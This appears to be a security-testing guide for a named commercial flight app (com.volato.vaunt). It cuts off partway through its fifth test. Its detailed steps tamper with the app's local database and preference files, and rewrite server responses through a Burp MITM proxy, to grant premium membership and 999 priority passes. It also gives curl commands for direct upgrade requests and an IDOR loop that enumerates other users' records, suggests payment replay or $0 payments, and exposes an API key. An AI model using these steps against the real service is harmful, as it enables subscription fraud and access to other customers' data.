# Vaunt Flight App - Complete LDPlayer Testing Suite
## Comprehensive Security Testing Guide (No ADB Required)

**Platform:** LDPlayer on Windows
**Method:** Local File Access via Windows Explorer
**Target App:** com.volato.vaunt (Version 1.1.36)
**Date Created:** November 4, 2025
**Status:** Ready for Complete Testing

---

## 📋 Table of Contents

1. [Overview & What You'll Test](#overview--what-youll-test)
2. [Environment Setup](#environment-setup)
3. [TEST 1: AsyncStorage Manipulation](#test-1-asyncstorage-manipulation)
4. [TEST 2: Shared Preferences Inspection](#test-2-shared-preferences-inspection)
5. [TEST 3: Man-in-the-Middle (MITM) Attack](#test-3-man-in-the-middle-mitm-attack)
6. [TEST 4: API Endpoint Testing](#test-4-api-endpoint-testing)
7. [TEST 5: JavaScript Bundle Analysis](#test-5-javascript-bundle-analysis)
8. [TEST 6: AndroidManifest & Secrets Extraction](#test-6-androidmanifest--secrets-extraction)
9. [TEST 7: Runtime Manipulation with Frida](#test-7-runtime-manipulation-with-frida-advanced)
10. [TEST 8: Root Detection Testing](#test-8-root-detection-testing)
11. [TEST 9: Deep Link Security](#test-9-deep-link-security)
12. [TEST 10: File Permissions Audit](#test-10-file-permissions-audit)
13. [Complete Testing Checklist](#complete-testing-checklist)
14. [Reporting Template](#reporting-template)

---

## 🎯 Overview & What You'll Test

### Security Vulnerabilities to Verify

Based on the **Security Analysis Report**, you will test for:

1. ✅ **Unencrypted Client-Side Storage** (CWE-312)
   - AsyncStorage data in plaintext
   - Membership status stored locally
   - Authentication tokens unencrypted

2. ✅ **Client-Side Membership Validation** (CWE-602)
   - Subscription status checked on client
   - Premium features unlockable locally
   - Priority pass counts modifiable

3. ✅ **No Certificate Pinning** (CWE-295)
   - MITM attacks possible
   - API responses modifiable
   - Payment flows interceptable

4. ✅ **Exposed Business Logic** (CWE-540)
   - JavaScript bundle unobfuscated
   - API endpoints discoverable
   - Validation logic reverse-engineerable

5. ✅ **No Anti-Tampering** (CWE-353)
   - No root detection
   - No integrity checks
   - No anti-debugging

6. ✅ **Exposed API Keys**
   - Google Maps API: `AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw`
   - Firebase configuration in manifest
   - Facebook SDK keys

7. ✅ **Insecure Deep Links**
   - Custom schemes: `vaunt://`, `com.volato.vaunt://`, `exp+vaunt://`
   - Potential for deep link hijacking

---

## 🔧 Environment Setup

### Phase 1: Install LDPlayer

1. **Download LDPlayer:**
   ```
   URL: https://www.ldplayer.net/
   Version: LDPlayer 9 (recommended)
   File Size: ~500MB
   ```

2. **Installation:**
   - Run installer with default settings
   - Complete installation (takes 5-10 minutes)
   - Launch LDPlayer
   - Wait for Android to boot completely

3. **Configure Performance:**
   - Click **Menu (☰)** → **Settings**
   - **Performance Tab:**
     ```
     CPU Cores: 4
     RAM: 4096 MB (4GB)
     Resolution: 1080x1920 (Portrait Phone)
     DPI: 240
     Graphics: OpenGL
     ```
   - Click **Save**

4. **Enable Root Access:**
   - Settings → **Other Settings** tab
   - Toggle **Root permission: ON**
   - Click **Save**
   - **⚠️ IMPORTANT: Restart LDPlayer** (close and reopen)

5. **Verify Root:**
   - Open any terminal app or file manager
   - Check for "Superuser" permissions dialog
   - Root should be enabled

---

### Phase 2: Install Required Tools (Windows)

#### Tool 1: DB Browser for SQLite ⭐ (Essential)

```
URL: https://sqlitebrowser.org/dl/
Download: "DB Browser for SQLite - Standard installer for Windows"
Install: Default options
Purpose: View and edit AsyncStorage databases
```

#### Tool 2: Notepad++ (Essential)

```
URL: https://notepad-plus-plus.org/downloads/
Download: Latest version
Install: Default options
Purpose: View XML files, configuration files, analyze bundle
```

#### Tool 3: 7-Zip (Essential)

```
URL: https://www.7-zip.org/
Download: 64-bit Windows installer
Install: Default options
Purpose: Extract XAPK and APK files
```

#### Tool 4: Burp Suite Community (For MITM Testing)

```
URL: https://portswigger.net/burp/communitydownload
Requirements: Java JRE (will be installed automatically)
Purpose: Intercept and modify network traffic
```

#### Tool 5: Java JDK (For Burp Suite)

```
URL: https://www.java.com/en/download/
Version: Latest JRE
Purpose: Run Burp Suite
```

---

### Phase 3: Install Apps in LDPlayer

#### Install X-plore File Manager (Root Access)

1. **Open Play Store** in LDPlayer
2. **Search:** "X-plore File Manager"
3. **Install** (free app)
4. **Launch X-plore**
5. **Enable Root:**
   - Menu (☰) → Settings
   - Scroll to **Root access**
   - Toggle ON
   - Grant superuser when prompted

#### Install Vaunt App

**Method A - Drag & Drop (Easiest):**
1. Locate your XAPK/APK file:
   ```
   Path: Vaunt.xapk
   Or: com.volato.vaunt.apk
   ```
2. **Drag file onto LDPlayer window**
3. LDPlayer auto-installs
4. Wait for "App installed" notification

**Method B - Manual Install:**
1. Copy APK to: `C:\Users\YourUsername\Documents\ldplayer\`
2. In LDPlayer: Open **File Manager**
3. Navigate to Documents folder
4. Tap APK file to install

---

### Phase 4: Create Testing Environment

1. **Create Windows Testing Folder:**
   ```
   C:\VauntTesting\
   ├── original_files\
   ├── modified_files\
   ├── screenshots\
   ├── evidence\
   ├── results\
   └── tools\
   ```

2. **Launch Vaunt and Create Test Account:**
   - Open Vaunt app in LDPlayer
   - Create NEW test account (use burner email)
   - Log in and complete onboarding
   - Note your initial membership status (likely "Core")
   - Take screenshot of profile page

3. **Document Baseline:**
   ```
   Test Account Email: _________________
   Initial Membership: Core / Cabin+ (likely Core)
   Subscription Status: Inactive / Active
   Priority Passes: ______
   Account Created: [Date/Time]
   ```

---

## 🧪 TEST 1: AsyncStorage Manipulation

**Objective:** Access unencrypted local storage and modify membership status
**Risk Level:** 🔴 CRITICAL
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**Difficulty:** ⭐ (Very Easy with LDPlayer)
**Expected Time:** 20 minutes

---

### Step 1.1: Use the App to Establish Baseline

1. **Open Vaunt app** in LDPlayer
2. **Navigate to Profile:**
   - Tap your profile picture or menu
   - View "My Account" or "Membership" section
3. **Document current status:**
   - Membership Tier: __________
   - Subscription Status: __________
   - Subscription Expires: __________
   - Priority Passes: __________
4. **Take screenshot:** Save as `C:\VauntTesting\screenshots\01_original_membership.png`
5. **Force close the app:**
   - LDPlayer → Recent Apps (square button)
   - Swipe away Vaunt
   - Or: Settings → Apps → Vaunt → **Force Stop**

---

### Step 1.2: Locate AsyncStorage Database

1. **Open X-plore File Manager** in LDPlayer
2. **Enable Root Mode** (if not already):
   - Menu → Settings → Root access → ON
   - Grant superuser permission
3. **Navigate to app data directory:**
   ```
   Path: Root → data → data → com.volato.vaunt → databases

   Full path: /data/data/com.volato.vaunt/databases/
   ```
4. **Look for AsyncStorage files:**
   - `RKStorage` (React Native default)
   - `AsyncStorage.db`
   - `ReactNativeAsyncStorage`
   - `ReactNativeAsyncStorageDB`

   **Most likely:** `RKStorage` (no extension)

5. **Take screenshot:** Show directory listing

---

### Step 1.3: Copy Database to Windows

1. **In X-plore, long-press `RKStorage` file**
2. **Tap → Copy**
3. **Navigate to shared location:**
   - Tap **Back** button until you see "Root", "sdcard", etc.
   - Tap **sdcard**
   - Tap **Documents** (or **Download**)
4. **Paste** the file here
5. **Switch to Windows PC:**
   - Open Windows Explorer
   - Navigate to: `C:\Users\YourUsername\Documents\ldplayer\`
   - You should see **RKStorage** file here!

6. **Create backup:**
   - Copy `RKStorage` to `C:\VauntTesting\original_files\`
   - Rename copy to: `RKStorage_ORIGINAL_BACKUP`

7. **Copy working file:**
   - Copy `RKStorage` to `C:\VauntTesting\modified_files\`

---

### Step 1.4: Open and Analyze Database

1. **Launch DB Browser for SQLite**
   - Start Menu → DB Browser for SQLite

2. **Open database:**
   - Click **Open Database** button (folder icon)
   - Navigate to: `C:\VauntTesting\modified_files\RKStorage`
   - Click **Open**

3. **View table structure:**
   - Click **Browse Data** tab
   - Table dropdown → Select **catalystLocalStorage**
   - You'll see columns: `key` | `value`

4. **Search for sensitive keys:**

   Use **Filter** or **Ctrl+F** to search for:

   **User Data:**
   - `@User`
   - `@UserData`
   - `@UserProfile`
   - `@CurrentUser`

   **Membership Data:**
   - `membership`
   - `Membership`
   - `subscription`
   - `Subscription`
   - `cabin`
   - `Cabin`
   - `premium`
   - `Premium`

   **Auth Tokens:**
   - `token`
   - `Token`
   - `auth`
   - `Auth`
   - `jwt`
   - `JWT`

   **Priority Passes:**
   - `priority`
   - `Priority`
   - `passes`
   - `Passes`

5. **Document all sensitive keys found:**
   ```
   Key Name                    | Value Preview
   ----------------------------|---------------------------
   @UserData                   | {"id":"123","email":"..."}
   @MembershipInfo             | {"tier":"core",...}
   @AuthToken                  | "eyJhbGc..."
   ...                         | ...
   ```

6. **Take screenshots:**
   - Full table view
   - Each sensitive key/value pair
   - Save to `C:\VauntTesting\screenshots\`

---

### Step 1.5: Modify Membership Data

**⚠️ CRITICAL: Only for authorized testing!**

1. **Locate membership-related row:**
   - Look for key containing: `membership`, `subscription`, `user`, etc.
   - Example key: `@MembershipData` or `@UserProfile:user123`

2. **Double-click the `value` cell** to edit

3. **Example Modification:**

   **BEFORE (Core member):**
   ```json
   {
     "membershipLevel": "core",
     "subscriptionStatus": "inactive",
     "priorityPasses": 0,
     "subscriptionExpiresAt": null,
     "userId": "12345"
   }
   ```

   **AFTER (Cabin+ member - MODIFIED):**
   ```json
   {
     "membershipLevel": "cabin_plus",
     "subscriptionStatus": "active",
     "priorityPasses": 999,
     "subscriptionExpiresAt": "2099-12-31T23:59:59.000Z",
     "userId": "12345"
   }
   ```

   **Key Changes:**
   - `core` → `cabin_plus`
   - `inactive` → `active`
   - `0` → `999` (priority passes)
   - `null` → `"2099-12-31..."` (far future date)

4. **Save changes:**
   - Click **Write Changes** button (disk/save icon)
   - Confirm: **Yes**

5. **Verify modification:**
   - Re-check the value to ensure it saved
   - Take screenshot of modified data

6. **Close DB Browser**

---

### Step 1.6: Copy Modified Database Back to LDPlayer

1. **Ensure Vaunt app is closed:**
   - In LDPlayer: Settings → Apps → Vaunt → **Force Stop**

2. **Copy modified file to transfer location:**
   - Windows: Copy `C:\VauntTesting\modified_files\RKStorage`
   - Paste to: `C:\Users\YourUsername\Documents\ldplayer\RKStorage`
   - **Overwrite** if asked

3. **In LDPlayer X-plore:**
   - Navigate to: **sdcard → Documents**
   - You should see the modified **RKStorage** file
   - **Long-press** on RKStorage
   - **Copy**

4. **Navigate to app database directory:**
   - Root → data → data → com.volato.vaunt → databases
   - **Long-press in empty space**
   - **Paste**
   - Confirm overwrite: **Yes**
   - Grant root permission if asked

5. **Verify file was replaced:**
   - Check file timestamp (should be recent)
   - File size should match

---

### Step 1.7: Test the Exploit

1. **Launch Vaunt app** in LDPlayer

2. **Navigate to Profile/Membership section**

3. **Check for changes:**
   - ✅ Membership tier shows "Cabin+" instead of "Core"?
   - ✅ Subscription status shows "Active"?
   - ✅ Subscription expires on "2099-12-31" or far future?
   - ✅ Priority passes show 999?

4. **Test premium features:**
   - Can you access Cabin+ exclusive features?
   - Try booking a flight with priority
   - Check if premium options are unlocked
   - Verify waitlist priority is elevated

5. **Document results:**
   ```
   Modified Membership Tier:    _____________
   Modified Subscription Status: _____________
   Modified Priority Passes:     _____________
   App Accepted Changes:         YES / NO / PARTIAL
   Premium Features Unlocked:    YES / NO / PARTIAL
   ```

6. **Take screenshots:**
   - Profile page showing new membership
   - Any premium features now accessible
   - Booking screen with priority options
   - Save all to `C:\VauntTesting\screenshots\`

---

### Step 1.8: Test Persistence

1. **Close and reopen the app:**
   - Force close Vaunt
   - Relaunch
   - Check if changes persisted

2. **Clear app cache (test if changes survive):**
   - Settings → Apps → Vaunt → **Clear Cache** (NOT Clear Data)
   - Relaunch app
   - Check if membership still shows as modified

3. **Document persistence:**
   ```
   Changes persist after restart:   YES / NO
   Changes persist after clear cache: YES / NO
   ```

---

### Step 1.9: Additional Testing

**Test 1.9.1: Modify Other Values**

Try modifying:
- Email address
- Phone number
- Name
- User ID (WARNING: may break account)
- Subscription end date to past date (does it revoke access?)

**Test 1.9.2: Inject Invalid Data**

Test app's validation:
```json
{
  "membershipLevel": "SUPER_PREMIUM_HACKED",
  "priorityPasses": 99999999,
  "subscriptionExpiresAt": "9999-12-31T23:59:59.000Z"
}
```

Does the app:
- Crash?
- Ignore invalid values?
- Fall back to default?
- Accept anything?

**Test 1.9.3: Remove Required Fields**

Delete critical fields and test:
```json
{
  "membershipLevel": "cabin_plus"
  (remove subscriptionStatus, priorityPasses, etc.)
}
```

---

### Step 1.10: Document Test 1 Results

Create: `C:\VauntTesting\results\TEST1_AsyncStorage_Results.txt`

```
============================================
TEST 1: AsyncStorage Manipulation
============================================

Date: ____________
Tester: ____________
App Version: 1.1.36
Platform: LDPlayer on Windows

BASELINE DATA:
- Original Membership: Core
- Original Subscription: Inactive
- Original Priority Passes: 0

DATABASE LOCATION:
- Path: /data/data/com.volato.vaunt/databases/RKStorage
- File Size: _______ bytes
- Type: SQLite database

SENSITIVE KEYS FOUND:
1. Key: __________________ | Contains: ____________
2. Key: __________________ | Contains: ____________
3. Key: __________________ | Contains: ____________

MODIFICATION PERFORMED:
- Changed membershipLevel: "core" → "cabin_plus"
- Changed subscriptionStatus: "inactive" → "active"
- Changed priorityPasses: 0 → 999
- Changed subscriptionExpiresAt: null → "2099-12-31T23:59:59.000Z"

RESULTS:
[✓] Database successfully copied to Windows
[✓] Database opened in DB Browser for SQLite
[✓] Membership data located
[✓] Data successfully modified
[✓] Modified database copied back to LDPlayer
[ ] App accepted modified data: YES / NO / PARTIAL
[ ] Premium features unlocked: YES / NO / PARTIAL
[ ] Changes persisted after restart: YES / NO
[ ] Changes persisted after cache clear: YES / NO

IMPACT ASSESSMENT:
Severity: CRITICAL
CWE: CWE-312 (Cleartext Storage of Sensitive Information)
CVSS Score: _______ (estimate)

EXPLOITABILITY:
- Ease of Exploitation: Very Easy (GUI-only, no coding required)
- Required Access: Root access (easily available on emulators)
- Technical Skill: Low (point-and-click)
- Attack Vector: Local

BUSINESS IMPACT:
- Users can grant themselves premium memberships without payment
- Revenue loss from bypassed subscriptions
- Priority pass system can be gamed
- Unfair advantage in waitlist system

EVIDENCE:
- Screenshot: 01_original_membership.png
- Screenshot: 02_database_table_view.png
- Screenshot: 03_membership_data_original.png
- Screenshot: 04_membership_data_modified.png
- Screenshot: 05_modified_membership_in_app.png
- File: RKStorage_ORIGINAL_BACKUP
- File: RKStorage_MODIFIED

RECOMMENDATIONS:
1. IMMEDIATE: Move all membership validation to server-side
2. IMMEDIATE: Stop storing subscription status locally
3. SHORT TERM: Implement encrypted storage (EncryptedSharedPreferences)
4. SHORT TERM: Add root detection and block rooted devices
5. LONG TERM: Regular server-side validation of client state

============================================
```

---

## 🧪 TEST 2: Shared Preferences Inspection

**Objective:** Examine XML configuration files for sensitive data
**Risk Level:** 🟠 MEDIUM
**CWE:** CWE-312 (Cleartext Storage)
**Difficulty:** ⭐ (Very Easy)
**Expected Time:** 15 minutes

---

### Step 2.1: Locate Shared Preferences

1. **In LDPlayer X-plore, navigate to:**
   ```
   Path: Root → data → data → com.volato.vaunt → shared_prefs
   ```

2. **List all XML files:**
   - `com.volato.vaunt_preferences.xml`
   - `ReactNativePreferences.xml`
   - `IntercomSettings.xml`
   - `OneSignalPreferences.xml`
   - `MixpanelPreferences.xml`
   - Others...

3. **Copy all XML files to Windows:**
   - Select all XML files in X-plore
   - Copy → sdcard → Documents
   - Access from Windows: `C:\Users\...\Documents\ldplayer\`

---

### Step 2.2: Analyze XML Files

1. **Open each XML with Notepad++**
   - Right-click XML file → Open with Notepad++

2. **Look for sensitive data:**

   **Example `com.volato.vaunt_preferences.xml`:**
   ```xml
   <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
   <map>
       <boolean name="has_premium_access" value="false" />
       <string name="user_email">test@example.com</string>
       <string name="user_id">12345</string>
       <string name="membership_tier">core</string>
       <int name="priority_passes_count" value="0" />
       <boolean name="subscription_active" value="false" />
       <string name="api_token">eyJhbGciOiJIUzI1NiIsInR5cCI6...</string>
   </map>
   ```

3. **Document all sensitive findings:**
   - Authentication tokens
   - API keys
   - User credentials
   - Feature flags
   - Debug settings

---

### Step 2.3: Modify Shared Preferences (If Applicable)

1. **Edit XML file** in Notepad++:

   **BEFORE:**
   ```xml
   <boolean name="has_premium_access" value="false" />
   <string name="membership_tier">core</string>
   ```

   **AFTER:**
   ```xml
   <boolean name="has_premium_access" value="true" />
   <string name="membership_tier">cabin_plus</string>
   ```

2. **Save file**

3. **Copy back to LDPlayer:**
   - Place modified XML in Documents folder
   - Use X-plore to copy to shared_prefs directory
   - Overwrite original

4. **Test if changes take effect**

---

### Step 2.4: Document Test 2 Results

```
============================================
TEST 2: Shared Preferences Inspection
============================================

XML FILES FOUND:
1. _______________________.xml
2. _______________________.xml
3. _______________________.xml

SENSITIVE DATA DISCOVERED:
- Authentication tokens: YES / NO
- API keys: YES / NO
- User credentials: YES / NO
- Feature flags: YES / NO

MODIFICATION ATTEMPT:
- Successfully modified: YES / NO
- App accepted changes: YES / NO

IMPACT: MEDIUM
============================================
```

---

## 🧪 TEST 3: Man-in-the-Middle (MITM) Attack

**Objective:** Intercept and modify API traffic
**Risk Level:** 🔴 CRITICAL
**CWE:** CWE-295 (Improper Certificate Validation)
**Difficulty:** ⭐⭐⭐ (Moderate)
**Expected Time:** 45 minutes

---

### Step 3.1: Set Up Burp Suite

1. **Launch Burp Suite Community Edition**
   - Start Menu → Burp Suite Community Edition
   - Temporary Project → Use Burp defaults → Start

2. **Configure Proxy Listener:**
   - **Proxy** tab → **Options** (or **Settings** tab → **Tools** → **Proxy**)
   - Under **Proxy Listeners**, verify listener on `127.0.0.1:8080`
   - If not exists: **Add** → Port: `8080`, Bind: `All interfaces`

3. **Export Burp CA Certificate:**
   - Proxy → Options → **Import / export CA certificate**
   - **Export** → **Certificate in DER format**
   - Save as: `C:\VauntTesting\tools\burp-cert.cer`

4. **Get your Windows IP address:**
   ```
   Open Command Prompt:
   > ipconfig

   Look for: IPv4 Address . . . . . . . . . . : 192.168.x.x
   Note this IP (example: 192.168.1.100)
   ```

---

### Step 3.2: Configure LDPlayer Proxy

1. **Copy Burp certificate to LDPlayer:**
   - Copy `burp-cert.cer` to: `C:\Users\...\Documents\ldplayer\`

2. **In LDPlayer:**
   - Open **Settings** → **WLAN** (or **Wi-Fi**)
   - **Long-press** on the connected network ("WiredSSID" usually)
   - Select **Modify network**
   - Check **Show advanced options**
   - **Proxy:** Manual
   - **Proxy hostname:** Your Windows IP (e.g., `192.168.1.100`)
   - **Proxy port:** `8080`
   - **Save**

3. **Install Burp Certificate:**
   - LDPlayer: **Settings** → **Security** → **Install from storage**
   - Navigate to **Documents** folder
   - Select `burp-cert.cer`
   - Name it: `Burp Suite CA`
   - Click **OK**
   - If asked for lock screen: Set up PIN/Pattern

4. **Allow Windows Firewall:**
   ```
   Run as Administrator in Command Prompt:
   > netsh advfirewall firewall add rule name="Burp Proxy" dir=in action=allow protocol=TCP localport=8080
   ```

---

### Step 3.3: Verify Proxy is Working

1. **In LDPlayer, open Chrome browser**

2. **Visit:** `http://burpsuite`
   - You should see Burp Suite welcome page
   - If not loading: proxy not configured correctly

3. **Visit:** `https://google.com`
   - Should load normally
   - Check Burp Suite → Proxy → HTTP history
   - You should see requests to google.com

4. **If not working:**
   - Check Windows IP is correct
   - Check Windows Firewall allows port 8080
   - Restart LDPlayer
   - Re-install certificate

---

### Step 3.4: Capture Vaunt App Traffic

1. **In Burp Suite:**
   - Proxy → Intercept → Turn **OFF** (for now)
   - Go to HTTP history tab → **Clear** all

2. **In LDPlayer, launch Vaunt app**

3. **Perform actions:**
   - Log in (if not already)
   - Navigate to profile
   - View flights
   - Check membership status
   - Try to book a flight

4. **In Burp Suite HTTP history:**
   - You should see requests to Vaunt API endpoints
   - Look for domains like:
     - `api.vaunt.com`
     - `vaunt.com`
     - Any Vaunt-related domains

5. **Document API endpoints discovered:**
   ```
   GET  https://api.vaunt.com/v1/user/profile
   GET  https://api.vaunt.com/v1/membership/status
   POST https://api.vaunt.com/v1/flights/search
   GET  https://api.vaunt.com/v1/user/bookings
   POST https://api.vaunt.com/v1/user/createApplePaySetupIntent
   ...
   ```

---

### Step 3.5: Intercept and Modify Responses

1. **In Burp Suite:**
   - Proxy → Intercept → Turn **ON**

2. **In Vaunt app:**
   - Navigate to Profile or Membership page
   - This triggers a membership status API call

3. **In Burp Suite Intercept tab:**
   - Requests will be held
   - **Forward** requests until you see a GET request to:
     - `/user/profile`
     - `/membership/status`
     - `/user/subscription`
   - Click **Forward** to send the request

4. **Wait for RESPONSE:**
   - The response will be held in Intercept
   - You'll see JSON like:
     ```json
     {
       "success": true,
       "data": {
         "userId": "12345",
         "email": "test@test.com",
         "membershipLevel": "core",
         "subscriptionStatus": "inactive",
         "priorityPasses": 0,
         "subscriptionExpiresAt": null
       }
     }
     ```

5. **Modify the response:**
   - Click in the response body
   - Change:
     ```json
     {
       "success": true,
       "data": {
         "userId": "12345",
         "email": "test@test.com",
         "membershipLevel": "cabin_plus",
         "subscriptionStatus": "active",
         "priorityPasses": 999,
         "subscriptionExpiresAt": "2099-12-31T23:59:59.000Z"
       }
     }
     ```

6. **Forward the modified response:**
   - Click **Forward**
   - Turn Intercept **OFF**

7. **Check the app:**
   - Profile should now show modified membership!
   - Premium features unlocked?

---

### Step 3.6: Set Up Auto-Modification (Match and Replace)

For persistent modification without manual intervention:

1. **Burp Suite → Proxy → Options → Match and Replace**

2. **Add Rule 1:**
   - Type: **Response body**
   - Match: `"membershipLevel":"core"`
   - Replace: `"membershipLevel":"cabin_plus"`
   - Regex match: ☐ (unchecked)
   - Click **OK**

3. **Add Rule 2:**
   - Type: **Response body**
   - Match: `"subscriptionStatus":"inactive"`
   - Replace: `"subscriptionStatus":"active"`
   - Click **OK**

4. **Add Rule 3:**
   - Type: **Response body**
   - Match: `"priorityPasses":0`
   - Replace: `"priorityPasses":999`
   - Click **OK**

5. **Enable all rules**

6. **Test:**
   - Clear app cache and relaunch
   - All responses automatically modified!
   - Premium status should appear immediately

---

### Step 3.7: Test Certificate Pinning

**Objective:** Verify if app has SSL pinning

1. **If Burp proxy works and shows HTTPS traffic:**
   - ❌ NO certificate pinning implemented
   - ✅ App trusts any CA certificate
   - 🔴 CRITICAL vulnerability

2. **If you see SSL errors in app:**
   - ✅ Certificate pinning might be present
   - But unlikely based on security analysis

3. **Document:**
   ```
   Certificate Pinning Present: YES / NO
   HTTPS Traffic Interceptable: YES / NO
   ```

---

### Step 3.8: Capture Payment Flow

1. **In Burp, clear HTTP history**

2. **In Vaunt app:**
   - Try to purchase Priority Upgrade
   - Or subscribe to Cabin+
   - Stop before completing payment

3. **In Burp HTTP history:**
   - Look for Stripe API calls
   - Apple Pay setup intents
   - Payment confirmation endpoints

4. **Analyze requests:**
   ```
   POST /v1/user/createApplePaySetupIntent
   POST /v1/payment/intent
   POST /v1/payment/confirm
   ```

5. **Test if you can:**
   - Replay successful payment confirmation
   - Modify payment amount to $0
   - Skip payment but send success response

---

### Step 3.9: Document Test 3 Results

```
============================================
TEST 3: Man-in-the-Middle (MITM) Attack
============================================

PROXY SETUP:
[✓] Burp Suite configured
[✓] Proxy configured in LDPlayer
[✓] Certificate installed
[✓] HTTPS traffic intercepted

CERTIFICATE PINNING:
- Present: YES / NO
- HTTPS Interceptable: YES / NO
- Impact: CRITICAL / HIGH / MEDIUM / LOW

API ENDPOINTS DISCOVERED:
1. GET  /v1/user/profile
2. GET  /v1/membership/status
3. POST /v1/flights/search
4. ...

MEMBERSHIP MODIFICATION:
[✓] Successfully intercepted membership response
[✓] Modified membershipLevel in response
[ ] App accepted modified response: YES / NO
[ ] Premium features unlocked: YES / NO

MATCH AND REPLACE:
[✓] Auto-modification rules configured
[ ] Rules working: YES / NO

PAYMENT FLOW:
- Payment endpoints found: YES / NO
- Payment replay possible: YES / NO / UNTESTED

SEVERITY: CRITICAL
CWE: CWE-295 (Improper Certificate Validation)

EVIDENCE:
- Burp project saved: vaunt_mitm_test.burp
- Screenshots of modified responses
- API endpoint list

============================================
```

---

## 🧪 TEST 4: API Endpoint Testing

**Objective:** Test API endpoints directly via curl/Postman
**Risk Level:** 🔴 HIGH
**CWE:** CWE-639 (Authorization Bypass)
**Difficulty:** ⭐⭐ (Moderate)
**Expected Time:** 30 minutes

---

### Step 4.1: Extract Authentication Token

**From Test 3 (Burp Suite):**

1. **In Burp HTTP history:**
   - Find login request or any authenticated request
   - Look in **Request headers** for:
     ```
     Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
     ```
   - Or in **Request cookies**:
     ```
     Cookie: auth_token=...
     ```

2. **Copy the token:**
   - Right-click → Copy value
   - Save to: `C:\VauntTesting\auth_token.txt`

**From Test 1 (AsyncStorage):**

1. **In DB Browser, find token key:**
   - `@AuthToken`
   - `@UserToken`
   - `token`

2. **Copy token value**

---

### Step 4.2: Test User Profile Endpoint

**Using curl in Command Prompt:**

1. **Set variables:**
   ```batch
   set TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   set API_URL=https://api.vaunt.com
   ```

2. **Get user profile:**
   ```batch
   curl -X GET "%API_URL%/v1/user/profile" ^
     -H "Authorization: Bearer %TOKEN%" ^
     -H "Content-Type: application/json"
   ```

3. **Save response:**
   ```batch
   curl -X GET "%API_URL%/v1/user/profile" ^
     -H "Authorization: Bearer %TOKEN%" ^
     -H "Content-Type: application/json" ^
     > C:\VauntTesting\evidence\profile_response.json
   ```

4. **Analyze response:**
   - Open `profile_response.json` in Notepad++
   - Look for membership data, user info, etc.

---

### Step 4.3: Attempt Membership Manipulation via API

**Test 1: Try to upgrade membership directly**

```batch
curl -X POST "%API_URL%/v1/membership/upgrade" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"membershipLevel\":\"cabin_plus\",\"expiresAt\":\"2099-12-31\"}"
```

**Expected Results:**
- ✅ `200 OK` → CRITICAL vulnerability! Direct upgrade possible
- ❌ `403 Forbidden` → Proper authorization
- ❌ `400 Bad Request` → Endpoint doesn't exist
- ❌ `401 Unauthorized` → Token invalid

**Test 2: Try to update user profile**

```batch
curl -X PUT "%API_URL%/v1/user/profile" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"membershipLevel\":\"cabin_plus\",\"subscriptionStatus\":\"active\"}"
```

**Test 3: Try to add priority passes**

```batch
curl -X POST "%API_URL%/v1/user/priority-passes" ^
  -H "Authorization: Bearer %TOKEN%" ^
  -H "Content-Type: application/json" ^
  -d "{\"passes\":999}"
```

---

### Step 4.4: Test IDOR (Insecure Direct Object Reference)

1. **Get your own user ID from profile response**

2. **Try to access another user's data:**
   ```batch
   curl -X GET "%API_URL%/v1/user/12346" ^
     -H "Authorization: Bearer %TOKEN%"
   ```

3. **Increment user IDs and test:**
   ```batch
   FOR /L %i IN (12340,1,12350) DO (
     curl -s -X GET "%API_URL%/v1/user/%i" ^
       -H "Authorization: Bearer %TOKEN%" ^
       >> C:\VauntTesting\evidence\idor_test.txt
   )
   ```

4. **Analyze results:**
   - Can you see other users' data?
   - IDOR vulnerability if yes

---

### Step 4.5: Test Rate Limiting

Create: `C:\VauntTesting\tools\rate_limit_test.bat`

```batch
@echo off
set TOKEN=your_token_here
set API_URL=https://api.vaunt.com

echo Testing rate limiting...
FOR /L %%i IN (1,1,100) DO (
  echo Request %%i
  curl -s -X GET "%API_URL%/v1/user/profile" ^
    -H "Authorization: Bearer %TOKEN%" ^
    -w "%%{http_code}\n" ^
    -o nul
)
```

Run and analyze:
- All `200` responses → No rate limiting
- `429 Too Many Requests` → Rate limiting present

---

### Step 4.6: Document Test 4 Results

```
============================================
TEST 4: API Endpoint Direct Testing
============================================

AUTHENTICATION:
- Token Type: Bearer JWT / Other
- Token Successfully Extracted: YES / NO
- Token Valid: YES / NO

PROFILE ENDPOINT:
GET /v1/user/profile
- Status: 200 / 401 / 403 / 404
- Response Contains Membership Data: YES / NO

MEMBERSHIP MODIFICATION:
POST /v1/membership/upgrade
- Status: ____
- Result: VULNERABLE / PROTECTED

PUT /v1/user/profile (with membership fields)
- Status: ____
- Result: VULNERABLE / PROTECTED

POST /v1/user/priority-passes
- Status: ____
- Result: VULNERABLE / PROTECTED

IDOR VULNERABILITY:
- Tested User IDs: 12340-12350
- Other Users' Data Accessible: YES / NO
- Severity: CRITICAL / HIGH / N/A

RATE LIMITING:
- Present: YES / NO
- Limit: ____ requests before blocking

SEVERITY: ___________
CWE: CWE-639 (Authorization Bypass)

============================================
```

---

## 🧪 TEST 5: JavaScript Bundle Analysis

**Objective:** Extract and analyze app source code for secrets and logic
**Risk Level:** 🟠 HIGH
**CWE:** CWE-540 (Information Exposure Through Source Code)
**Difficulty:** ⭐⭐ (Moderate)
**Expected Time:** 30 minutes

---

### Step 5.1: Extract APK Components

1. **Locate XAPK file:**
   ```
   Path: Vaunt.xapk
   ```

2. **Rename to ZIP:**
   ```
   Right-click → Rename → Vaunt.zip
   ```

3. **Extract with 7-Zip:**
   ```
   Right-click → 7-Zip → Extract to "Vaunt\"
   ```

4. **Find main APK:**
   ```
   Vaunt\com.volato.vaunt.apk (largest file)
   ```

5. **Extract APK (also a ZIP):**
   ```
   Rename: com.volato.vaunt.apk → com.volato.vaunt.zip
   Right-click → Extract to "vaunt_apk\"
   ```

---

### Step 5.2: Locate JavaScript Bundle

1. **Navigate to:**
   ```
   vaunt_apk\assets\
   ```

2. **Find:**
   ```
   index.android.bundle (6.4 MB)
   ```

3. **Copy to testing folder:**
   ```
   Copy to: C:\VauntTesting\evidence\index.android.bundle
   ```

---

### Step 5.3: Search for Sensitive Strings

**Using Notepad++:**

1. **Open bundle:**
   ```
   File → Open → index.android.bundle
   ```
